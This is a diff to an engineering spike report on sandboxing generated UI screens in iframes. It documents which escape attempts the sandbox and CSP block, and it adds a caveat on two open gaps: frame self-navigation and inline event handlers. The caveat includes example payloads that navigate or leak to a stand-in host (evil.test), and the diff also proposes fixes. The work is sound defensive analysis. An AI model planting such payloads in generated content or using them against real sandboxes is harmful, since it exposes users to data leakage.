@@ -78,13 +78,15 @@ task brief — not introduced by this spike. `pnpm lint` exits 0.
 
 ### 1. Can a generated screen escape the sandbox?
 
-**PROVEN NO.** `e2e/prototype-sandbox.spec.ts` builds a real
-`buildPrototypeDocument` output and loads it into `sandbox="allow-scripts"`
-(`allow-same-origin` is never set). The spec runs an 11-attempt escape script
-— `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, image beacon, form
-submission, top-level navigation, `window.parent`/DOM access, `localStorage`,
-`document.cookie`, and `window.open` — against a local capture server. The
-capture server received **zero requests** across every attempt in every run.
+**PROVEN: scripted network/data egress is contained.** Not "all escape is
+impossible" — see the caveat below for what this does not cover.
+`e2e/prototype-sandbox.spec.ts` builds a real `buildPrototypeDocument` output
+and loads it into `sandbox="allow-scripts"` (`allow-same-origin` is never
+set). The spec runs an 11-attempt escape script — `fetch`, `XMLHttpRequest`,
+`WebSocket`, `EventSource`, image beacon, form submission, top-level
+navigation, `window.parent`/DOM access, `localStorage`, `document.cookie`,
+and `window.open` — against a local capture server. The capture server
+received **zero requests** across every attempt in every run.
 `top-navigation`, `parent-dom`, `local-storage`, and `cookie` all throw
 synchronously (opaque origin, no `allow-same-origin`); `window.open` is
 blocked at the browser level (no `allow-popups`); form submission is blocked
@@ -92,6 +94,31 @@ at navigation time (no `allow-forms`); `fetch`/`xhr`/`websocket`/`eventsource`/
 `beacon` are blocked by the CSP's `connect-src 'none'` / `img-src data:`.
 Stable across 3+ consecutive runs, most recently 5/5 passing in this task's
 verification pass.
+
+**Caveat — two vectors are NOT contained by sandbox+CSP alone, and neither
+is currently closed** (the safety scan that would catch them,
+`findScreenSafetyViolations`, is not wired into any render path — it exists
+as a pure function, called nowhere):
+
+- **Self-navigation of the preview frame.** A sandboxed iframe without
+  `allow-top-navigation` can still navigate *itself*. No CSP directive here
+  blocks this — `default-src 'none'` and `connect-src 'none'` govern
+  fetches/XHR/etc., not browsing-context navigation, and there is no
+  `navigate-to` directive in play. A generated screen with a plain
+  `<a href="https://evil.test/leak?x=…">` (not a `data-meld-action`, so the
+  routing harness never `preventDefault`s it) or an inline `location = …`
+  navigates the preview frame to an arbitrary origin.
+- **Inline event handlers.** `script-src 'unsafe-inline'` (required so the
+  harness's own inline script runs) also permits
+  `<button onclick="location='https://evil.test'">`.
+  `findScreenSafetyViolations` only scans `payload.script` — it is markup-blind,
+  so `on*=` handlers in markup evade every script rule.
+
+Exfiltration value of both is low — the frame is on an opaque origin with no
+cookies, storage, or session to leak; a navigation can only carry
+author-known constants in the URL, not secrets. That's why this is a
+hardening gap for slice 1, not a slice-0 blocker. See "Design changes
+surfaced by the spike" below for the required fix.
 
 ### 2. Does an inert (`sandbox=""`) frame refuse to run script?
 
@@ -199,6 +226,27 @@ exist.
 
 Follow-ups discovered during the spike, for slice 1 to inherit:
 
+- **Close the navigation / inline-handler boundary before shipping an
+  interactive viewer** (see finding #1's caveat above). Required before
+  slice 2's viewer ships:
+  - Add `script-src-attr 'none'` to `PROTOTYPE_CSP` — blocks inline `on*=`
+    handlers at the CSP layer regardless of the scan.
+  - Wire `findScreenSafetyViolations` as a **hard rejection gate** before
+    assembly, or at ingestion — it is presently defined but called nowhere.
+  - Extend the escape matrix (`e2e/prototype-sandbox.spec.ts`) with a
+    self-navigation case: a plain `<a href="https://evil.test/…">` or an
+    inline `location = …`, confirming the frame's own navigation is blocked
+    or otherwise contained.
+  - The scan itself must also cover markup `on*=` handlers (it currently
+    only scans `payload.script`), or the team can rely on the
+    `script-src-attr 'none'` CSP directive above instead of extending the
+    scan — either closes the gap, but one of them must ship.
+- **Minor slice-1 notes from review**, worth folding into the relevant
+  slice-1 work rather than tracking separately: derive `PrototypeScreen`
+  from `DesignScreenPayload` (currently a hand-parallel type, risking type
+  drift as the payload contract evolves); `REMOTE_URL` in the safety scan
+  misses a single-slash `https:/host` variant; `insertScreenFrame` hardcodes
+  `index`/`x`/`y` — fold this into the idempotency-and-position work below.
 - **Routing must be namespaced per screen.** The assembler's route table is
   currently flat, keyed by action id. Action ids are only unique **within a
   screen** (`DesignScreenPayloadSchema.superRefine`), so two screens each
